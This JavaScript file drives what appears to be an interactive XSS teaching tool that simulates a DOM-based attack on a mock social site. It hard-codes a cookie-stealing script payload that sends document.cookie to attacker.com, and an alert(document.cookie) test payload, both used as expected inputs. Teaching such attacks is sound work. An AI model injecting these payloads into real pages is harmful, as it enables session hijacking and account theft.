$(document).ready(function(){
    // Get_Started
    handle_get_started("kindofXSS");
    function handle_get_started(kindofAttack){
        $(document).on("click","#XSS",function(){
            $(".mainmenu").hide(1000);
            $(".submenu .back").removeAttr("style");
            $(".submenu ."+kindofAttack).removeAttr("style");
        });
        $(document).on("click",".submenu .back",function(){
            $(".submenu .back").attr({style:"display:none;"});
            $(".submenu ."+kindofAttack).attr({style:"display:none;"});
            $(".mainmenu").fadeIn(1000);

        });
    };
    // scroll bar
    function scrollbar(){
        $('.DOM_XSS .action .tutorial').animate({
            scrollTop: $('.DOM_XSS .action .tutorial').get(0).scrollHeight
        }, 1500);
    }
    // search
    function search(){
        $(document).on("keypress",".frame .domain",function(e){
            if(e.which === 13){
                var search=$(this).val();
                $(".browser .address").attr({value:"social.com?search="+search});
                //show step 4 action
                if(search=="<script>new image().src=”attacker.com?cookie=”+document.cookie;</script>"
                        && $('.action .tutorial .three').css('display') == 'block'){
                    $(".DOM_XSS .action .tutorial .four").fadeIn(2500); 
                    $(".DOM_XSS .action .interactive .three").hide(2500);
                    $(".browser .address").attr({value:"attacker.com?cookie="+Math.random()});
                    $(".DOM_XSS .action .interactive .four").fadeIn(2500); 
                    $(".action .back").removeAttr("id"); //back event 
                    $(".action .back").attr("id","backthree"); //back event 
                    $(".action .next").removeAttr("id");
                    $(".action .next").attr("id","nextfive");
                    scrollbar();
                }
                //show step 2 vulnerability
                if($('.vulnerability .tutorial .one').css('display') == 'block' && search){
                    $(".DOM_XSS .vulnerability .tutorial .two").fadeIn(2500); 
                    $(".vulnerability .back").removeAttr("id");
                    $(".vulnerability .back").attr("id","backone");
                    scrollbar();
                }
                //show step 3 vulnerability
                if($('.vulnerability .tutorial .two').css('display') == 'block' && search=="<script>alert(document.cookie)</script>"){
                    $(".DOM_XSS .vulnerability .tutorial .three").fadeIn(2500); 
                    $(".DOM_XSS .vulnerability .interactive .two").hide(2500); 
                    $(".DOM_XSS .vulnerability .interactive .three").fadeIn(2500); 
                    $(".vulnerability .back").removeAttr("id");
                    $(".vulnerability .back").attr("id","backtwo");
                    scrollbar();
                }
                //alert 
                if(search=="<script>alert(document.cookie)</script>"){
                    search="<script>alert('COOKIE: "+Math.random()+"')</script>";
                }
                $(this).append(search);
            }
        });
    };
    //url 
    function url(){
        $(document).on("keypress",".browser .url .address ",function(e){
            var link=$(this).val();
            if(e.which === 13 && link.search("search")!==-1){
                var script=link.slice(18);
                //show step 4 action
                if(script=="<script>new image().src=”attacker.com?cookie=”+document.cookie;</script>"
                        && $('.action .tutorial .three').css('display') == 'block'){
                    $(".DOM_XSS .action .tutorial .four").fadeIn(2500); 
                    $(".DOM_XSS .action .interactive .three").hide(2500);
                    $(".browser .address").attr({value:"attacker.com?cookie="+Math.random()});
                    $(".DOM_XSS .action .interactive .four").fadeIn(2500); 
                    $(".action .back").removeAttr("id"); //back event 
                    $(".action .back").attr("id","backthree"); //back event 
                    $(".action .next").removeAttr("id");
                    $(".action .next").attr("id","nextfive");
                    scrollbar();
                }
                //show step 2 vulnerability
                if($('.vulnerability .tutorial .one').css('display') == 'block' && script){
                    $(".DOM_XSS .vulnerability .tutorial .two").fadeIn(2500); 
                    $(".vulnerability .back").removeAttr("id");
                    $(".vulnerability .back").attr("id","backone");
                    scrollbar();
                }
                 //show step 3 vulnerability
                 if($('.vulnerability .tutorial .two').css('display') == 'block' && script=="<script>alert(document.cookie)</script>"){
                    $(".DOM_XSS .vulnerability .tutorial .three").fadeIn(2500); 
                    $(".DOM_XSS .vulnerability .interactive .two").hide(2500); 
                    $(".DOM_XSS .vulnerability .interactive .three").fadeIn(2500); 
                    $(".vulnerability .back").removeAttr("id");
                    $(".vulnerability .back").attr("id","backtwo");
                    scrollbar();
                }
                //alert 
                if(script=="<script>alert(document.cookie)</script>"){
                    script="<script>alert('COOKIE: "+Math.random()+"')</script>";
                }
                $(this).append(script);
            }
        });
    };
    // DOM_XSS

    //instruction
    $(".DOM_XSS .instruction #inst").hide(3000); 
    $(".DOM_XSS .instruction #inst1").fadeIn(2500).hide(2500);
    $(".DOM_XSS .instruction #inst1_1").fadeIn(2500);  
    //action
        //step 1
            //show step 1
                // back id="backinst"
                // next id=""
                    $(document).on("click",".DOM_XSS .instruction #inst1_1 .next",function(){
                        $(".DOM_XSS .instruction #inst1_1").hide(2500)
                        $(".DOM_XSS .action").fadeIn(2500);
                        $(".action .next").attr("disabled","").attr("title","Disabled"); // not next event
                        $(".DOM_XSS .action .tutorial").fadeIn(2500); //back event  
                        $(".DOM_XSS .action .tutorial .one").fadeIn(2500); 
                        $(".browser .address").attr({value:"social.com/login"});
                        $(".DOM_XSS .action .interactive").fadeIn(2500); //back event  
                        $(".DOM_XSS .action .interactive .one").fadeIn(2500);   
                        $(".action .next").fadeIn(); //back event 
                        $(".action .back").fadeIn(); //back event 
                        $(".action .back").attr("id","backinst"); //back event 
                        scrollbar();
                    });  
            //back to step inst
                // back id="backinst"
                // next id=""
                    $(document).on("click",".action #backinst",function(){
                        $(".action .next").hide();
                        $(".action .back").hide();
                        $(".DOM_XSS .action .tutorial").hide(); 
                        $(".DOM_XSS .action .interactive").hide();  
                        $(".DOM_XSS .instruction #inst1").fadeIn(2500).hide(2500);
                        $(".DOM_XSS .instruction #inst1_1").fadeIn(2500);
                        
                    });
        //step 2
            //show step 2
                // back id="backone"
                // next id="nextthree"
                    $(document).on("click",".DOM_XSS .interactive .one #login",function(){
                        var username=$("#username").val();
                        var password=$("#password").val();
                        if(username=="user1" && password=="password"){
                            $(".DOM_XSS .action .tutorial .two").fadeIn(2500); 
                            $(".DOM_XSS .action .interactive .one").hide(2500);
                            $(".DOM_XSS .action .interactive .two").fadeIn(2500); 
                            $(".action .back").removeAttr("id"); //back event 
                            $(".action .back").attr("id","backone"); //back event 
                            $(".action .next").removeAttr("disabled").attr("title","");   
                            $(".action .next").removeAttr("id");
                            $(".action .next").attr("id","nextthree");
                            scrollbar();
                        }
                    });
            //back to step 1
                // back id="backinst"
                // next id=""
                    $(document).on("click",".action #backone",function(){
                        $(".DOM_XSS .action .tutorial .two").hide(2500); 
                        $(".DOM_XSS .action .interactive .two").hide(2500); 
                        $(".DOM_XSS .action .tutorial .one").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive .one").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 1
                        $(".action .back").attr("id","backinst"); //reset back event of step 1
                        $(".action .next").removeAttr("id");
                        scrollbar();
                    });
            
            
            

        //step 3
            //show step 3
                // back id="backtwo"
                // next id=""
                    $(document).on("click",".action #nextthree",function(){
                        $(".DOM_XSS .action .interactive .two").hide(2500);
                        $(".DOM_XSS .action .tutorial .three").fadeIn(2500); 
                        $(".browser .address").attr({value:"social.com"});
                        $(".DOM_XSS .action .interactive .three").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backtwo"); //back event 
                        $(".action .next").attr("title","disabled");   
                        $(".action .next").removeAttr("id"); //back event 
                        scrollbar();

                    });
            //back to step 2
                // back id="backone"
                // next id="nextthree"
                    $(document).on("click",".action #backtwo",function(){
                        $(".DOM_XSS .action .tutorial .three").hide(2500); 
                        $(".DOM_XSS .action .interactive .three").hide(2500); 
                        $(".DOM_XSS .action .tutorial .two").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive .two").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 2
                        $(".action .back").attr("id","backone"); //reset back event of step 2
                        $(".action .next").removeAttr("id"); //reset back event of step 2
                        $(".action .next").attr("id","nextthree"); //reset back event of step 2
                        scrollbar();
                    });
            
        //step 4
            //show step 4
                // back id="backthree"
                // next id="nextfive"
                   search();
                      url();
            //back to step 3
                // back id="backtwo"
                // next id=""
                    $(document).on("click",".action #backthree",function(){
                        $(".DOM_XSS .action .tutorial .four").hide(2500); 
                        $(".DOM_XSS .action .interactive .four").hide(2500); 
                        $(".DOM_XSS .action .tutorial .three").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive .three").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 3
                        $(".action .back").attr("id","backtwo"); //reset back event of step 3
                        $(".action .next").removeAttr("id");
                    });
            
        //step 5
            //show step 5
                // back id="backfour"
                // next id="nextsix"
                    $(document).on("click",".action #nextfive",function(){
                        $(".DOM_XSS .action .tutorial .five").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backfour"); //back event 
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextsix");
                        scrollbar();

                    });
            //back to step 4
                // back id="backthree"
                // next id="nextfive"
                    $(document).on("click",".action #backfour",function(){
                        $(".DOM_XSS .action .tutorial .five").hide(2500); 
                        $(".DOM_XSS .action .tutorial .four").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 4
                        $(".action .back").attr("id","backthree"); //reset back event of step 4
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextfive");
                        scrollbar();
                    });
        //step 6
            //show step 6
                // back id="backfive"
                // next id="nextseven"
                    $(document).on("click",".action #nextsix",function(){
                        $(".DOM_XSS .action .tutorial .six").slideDown(2500); 
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backfive"); //back event 
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextseven");
                        scrollbar();

                    });
            //back to step 5
                // back id="backfour"
                // next id="nextsix"
                    $(document).on("click",".action #backfive",function(){
                        $(".DOM_XSS .action .tutorial .six").hide(2500); 
                        $(".DOM_XSS .action .tutorial .five").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 5
                        $(".action .back").attr("id","backfour"); //reset back event of step 5
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextsix");
                        scrollbar();
                    });
        //step 7 
            //show step 7
                // back id="backsix"
                // next id="switch_vulnerability"
                    $(document).on("click",".action #nextseven",function(){
                        var cookie=$(".browser .address").val().slice(20);
                        $(".browser .frame #cookie").text("Cookie: "+cookie);
                        $(".DOM_XSS .action .tutorial .seven").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive .four").hide(2500);
                        $(".DOM_XSS .action .interactive .seven").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backsix"); //back event 
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","switch_vulnerability");
                        scrollbar();
                    });
            //back to step 6
                // back id="backfive"
                // next id="nextseven"
                    $(document).on("click",".action #backsix",function(){
                        $(".DOM_XSS .action .tutorial .seven").hide(2500); 
                        $(".DOM_XSS .action .interactive .seven").hide(2500); 
                        $(".DOM_XSS .action .tutorial .six").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive .six").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 6
                        $(".action .back").attr("id","backfive"); //reset back event of step 6
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextseven"); //reset back event of step 6
                        scrollbar();
                    });

    //vulnerability
        // step 1
            // show step 1
                // back id="backseven" 
                // next id=""
                    $(document).on("click",".action #switch_vulnerability",function(){
                        //hide action
                        $(".DOM_XSS .action").hide(); 
                        $(".DOM_XSS .action .tutorial .one").hide(); 
                        $(".DOM_XSS .action .interactive .one").hide(); 
                        $(".DOM_XSS .action .tutorial .two").hide(); 
                        $(".DOM_XSS .action .interactive .two").hide(); 
                        $(".DOM_XSS .action .tutorial .three").hide(); 
                        $(".DOM_XSS .action .interactive .three").hide(); 
                        $(".DOM_XSS .action .tutorial .four").hide(); 
                        $(".DOM_XSS .action .interactive .four").hide(); 
                        $(".DOM_XSS .action .tutorial .five").hide(); 
                        $(".DOM_XSS .action .tutorial .six").hide(); 
                        $(".DOM_XSS .action .tutorial .seven").hide(); 
                        $(".DOM_XSS .action .interactive .seven").hide(); 
                        $(".DOM_XSS .action .next").hide(); 
                        $(".DOM_XSS .action .back").hide(); 
                        //fadeIn vulnerability
                        $(".DOM_XSS .instruction #inst2").fadeIn(2500).hide(2500);
                        $(".DOM_XSS .vulnerability").fadeIn(); 
                        $(".DOM_XSS .vulnerability .tutorial").fadeIn(2500); //back event  
                        $(".DOM_XSS .vulnerability .tutorial .one").fadeIn(2500); 
                        $(".DOM_XSS .vulnerability .interactive").fadeIn(2500); //back event  
                        $(".DOM_XSS .vulnerability .interactive .one").fadeIn(2500);   
                        $(".vulnerability .next").fadeIn(); //back event 
                        $(".vulnerability .back").fadeIn(); 
                        $(".vulnerability .back").attr("id","backseven"); //back event 
                        scrollbar();

                    });
            // back to step 7 action
                // back id="backsix"
                // next id="switch_vulnerability"
                    $(document).on("click",".vulnerability #backseven",function(e){
                        //hide vulnerability
                        $(".DOM_XSS .vulnerability").hide(); 
                        $(".DOM_XSS .vulnerability .tutorial").hide(); //back event  
                        $(".DOM_XSS .vulnerability .tutorial .one").hide(); 
                        $(".DOM_XSS .vulnerability .interactive").hide(); //back event  
                        $(".DOM_XSS .vulnerability .interactive .one").hide();   
                        $(".vulnerability .next").hide(); //back event 
                        $(".vulnerability .back").hide(); 
                        //fadeIn action
                        $(".DOM_XSS .action").fadeIn(2500);
                        $(".action .next").attr("disabled","").attr("title","Disabled"); // not next event
                        $(".DOM_XSS .action .tutorial").fadeIn(2500); //back event  
                        $(".DOM_XSS .action .tutorial .one").fadeIn(2500); 
                        $(".DOM_XSS .action .tutorial .two").fadeIn(2500); 
                        $(".DOM_XSS .action .tutorial .three").fadeIn(2500); 
                        $(".DOM_XSS .action .tutorial .four").fadeIn(2500); 
                        $(".DOM_XSS .action .tutorial .five").fadeIn(2500); 
                        $(".DOM_XSS .action .tutorial .six").fadeIn(2500); 
                        $(".DOM_XSS .action .tutorial .seven").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive").fadeIn(2500); //back event  
                        $(".DOM_XSS .action .interactive .seven").fadeIn(2500); 
                        $(".action .next").removeAttr("disabled").fadeIn(); //back event 
                        $(".action .back").fadeIn(); //back event 
                        //set id back next
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backsix"); //back event 
                        $(".action .next").removeAttr("id"); //back event 
                        $(".action .next").attr("id","switch_vulnerability"); //back event 
                        scrollbar();

                    });
        // step 2
            // show step 2
                // back id="backone"
                // next id=""
                // used on show step 4 action: search();
                // used on show step 4 action: url();


            // back to step 1
                // back id="backseven" (action)
                // next id=""
                    $(document).on("click",".vulnerability #backone",function(e){
                        $(".DOM_XSS .vulnerability .tutorial .two").hide(2500); 
                        $(".vulnerability .back").removeAttr("id"); //back event 
                        $(".vulnerability .back").attr("id","backseven"); //back event 
                        scrollbar();
                    });

    
        //step 3
            //show step 3
                // back id="backtwo"
                // next id=""
                // used on show step 4 action: search();
                // used on show step 4 action: url();

            // back to step 2
                // back id="backone" (action)
                // next id=""
                    $(document).on("click",".vulnerability #backtwo",function(e){
                        $(".DOM_XSS .vulnerability .tutorial .three").hide(2500); 
                        $(".DOM_XSS .vulnerability .interactive .three").hide(2500); 
                        $(".DOM_XSS .vulnerability .interactive .two").fadeIn(2500); 
                        $(".vulnerability .back").removeAttr("id"); //back event 
                        $(".vulnerability .back").attr("id","backone"); //back event 
                        scrollbar();
                    });
    //prevent

    


});
